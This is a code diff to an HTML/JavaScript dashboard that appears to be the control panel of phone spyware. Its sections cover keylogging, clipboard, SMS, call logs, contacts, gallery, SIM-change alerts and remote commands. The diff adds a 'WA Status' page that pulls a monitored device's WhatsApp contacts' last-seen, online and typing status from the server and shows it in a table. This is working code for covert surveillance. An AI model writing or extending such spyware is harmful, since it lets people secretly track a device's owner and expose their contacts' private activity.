@@ -165,6 +165,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
       <div class="nav-item" data-section="chats"><svg><use href="/static/icons.svg#icon-chat"/></svg> Chats</div>
       <div class="nav-item" data-section="facebook"><svg><use href="/static/icons.svg#icon-globe"/></svg> Facebook</div>
       <div class="nav-item" data-section="whatsapp"><svg><use href="/static/icons.svg#icon-chat"/></svg> WhatsApp</div>
+      <div class="nav-item" data-section="wastatus"><svg><use href="/static/icons.svg#icon-activity"/></svg> WA Status</div>
       <div class="nav-item" data-section="gallery"><svg><use href="/static/icons.svg#icon-camera"/></svg> Gallery</div>
       <div class="nav-item" data-section="contacts"><svg><use href="/static/icons.svg#icon-contacts"/></svg> Contacts</div>
       <div class="nav-item" data-section="apps"><svg><use href="/static/icons.svg#icon-apps"/></svg> App Usage</div>
@@ -291,6 +292,16 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
         <div class="card"><div class="card-header">Pesan WhatsApp</div><div class="card-body" id="waData"></div></div>
       </div>
 
+      <!-- ======== WHATSAPP STATUS ======== -->
+      <div class="section" id="sec-wastatus">
+        <div class="filter-bar">
+          <input type="text" id="waStatusDevice" placeholder="Device ID..." value="65057ab5f5" style="background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:6px 10px;color:var(--text);font-size:12px;width:140px">
+          <div class="filter-chip active" onclick="loadWAStatus()">Refresh</div>
+        </div>
+        <div class="stats-row" id="waStatusStats"></div>
+        <div class="card"><div class="card-header">Last Seen & Online Status</div><div class="card-body" id="waStatusData"></div></div>
+      </div>
+
       <!-- ======== GALLERY ======== -->
       <div class="section" id="sec-gallery">
         <div class="filter-bar">
@@ -364,7 +375,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <script>
 const BASE_URL = '{{ base_url }}';
-const SECTION_NAMES = {overview:'Overview',location:'Location',keylog:'Keylogger',clipboard:'Clipboard',calls:'Call Logs',sms:'SMS',notifications:'Notifications',chats:'Chats',facebook:'Facebook',whatsapp:'WhatsApp',gallery:'Gallery',contacts:'Contacts',apps:'App Usage',devices:'Devices',commands:'Commands',settings:'Settings'};
+const SECTION_NAMES = {overview:'Overview',location:'Location',keylog:'Keylogger',clipboard:'Clipboard',calls:'Call Logs',sms:'SMS',notifications:'Notifications',chats:'Chats',facebook:'Facebook',whatsapp:'WhatsApp',gallery:'Gallery',wastatus:'WA Status',contacts:'Contacts',apps:'App Usage',devices:'Devices',commands:'Commands',settings:'Settings'};
 
 function switchSection(name){
   document.querySelectorAll('.nav-item').forEach(e=>e.classList.remove('active'));
@@ -386,6 +397,7 @@ function switchSection(name){
   else if(name=='facebook') loadFacebook();
   else if(name=='whatsapp') loadWhatsapp();
   else if(name=='gallery') loadGallery();
+  else if(name=='wastatus') loadWAStatus();
   else if(name=='contacts') loadContacts();
   else if(name=='apps') loadApps();
   else if(name=='devices') loadDevices();
@@ -849,6 +861,26 @@ async function loadSimAlerts(){
   if(!d||!d.alerts||!d.alerts.length) return;
   let html=d.alerts.map(a=>`<div class="sim-alert"><span class="label">SIM CHANGE</span> ${a.device_id} — ${a.old_operator||'?'}→${a.new_operator||'?'} ${a.ts||''}</div>`).join('');
   document.getElementById('simAlertData').innerHTML=html;
+}
+
+// WA Status (Last Seen)
+async function loadWAStatus(){
+  let id=document.getElementById('waStatusDevice').value||'65057ab5f5';
+  let d=await api('/api/whatsapp-status/'+id);
+  if(!d||!d.statuses||!d.statuses.length) return void(document.getElementById('waStatusData').innerHTML='<div class="empty-state"><svg><use href="/static/icons.svg#icon-activity"/></svg><div>Belum ada data status WhatsApp</div></div>');
+  
+  document.getElementById('waStatusStats').innerHTML=
+    `<div class="stat-card"><div class="icon"><svg><use href="/static/icons.svg#icon-activity"/></svg></div><div class="num">${d.statuses.length}</div><div class="label">Total Status</div></div>
+    <div class="stat-card"><div class="icon"><svg><use href="/static/icons.svg#icon-chat"/></svg></div><div class="num">${new Set(d.statuses.map(s=>s.contact)).size}</div><div class="label">Kontak</div></div>`;
+  
+  let html='<table><tr><th>Waktu</th><th>Kontak</th><th>Status</th><th>App</th></tr>';
+  d.statuses.slice(0,50).forEach(s=>{
+    let time=s.ts||s.received||'';
+    let cls=s.status.toLowerCase().includes('online')||s.status.toLowerCase().includes('typing')?'badge-incoming':'';
+    html+=`<tr><td>${time.slice(11,19)}</td><td>${esc(s.contact)}</td><td class="${cls}">${esc(s.status)}</td><td>${esc(s.app)}</td></tr>`;
+  });
+  html+='</table>';
+  document.getElementById('waStatusData').innerHTML=html;
 }
 
 // Gallery
